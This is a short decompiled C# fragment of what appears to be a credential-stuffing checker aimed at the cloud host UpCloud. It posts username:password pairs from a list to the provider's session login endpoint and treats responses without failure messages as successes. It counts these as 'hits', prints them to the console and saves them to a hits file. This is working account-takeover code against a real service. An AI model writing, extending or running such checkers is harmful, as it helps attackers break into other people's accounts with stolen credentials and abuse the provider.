        ...
        while (true)
        {
          try
          {
            using (HttpRequest httpRequest = new HttpRequest())
            {
              ...
              string str2 = httpRequest.Post("https://gate.upcloud.com/v1/session", str1, "application/json; charset=UTF-8").ToString();
              if (!str2.Contains("Login failed") && !str2.Contains("Authentication credentials wrong"))
              {
                if (str2.Contains("Servers") || str2.Contains("Total"))
                {
                  ++mainmenu.hits;
                  if (mainmenu.p1 == "2")
                    Colorful.Console.WriteLine("[HIT - UPCLOUD] " + s[0] + ":" + s[1], Color.Green);
                  Export.AsResult("/Upcloud_hits", s[0] + ":" + s[1]);
                  return false;
                }
                break;
              }
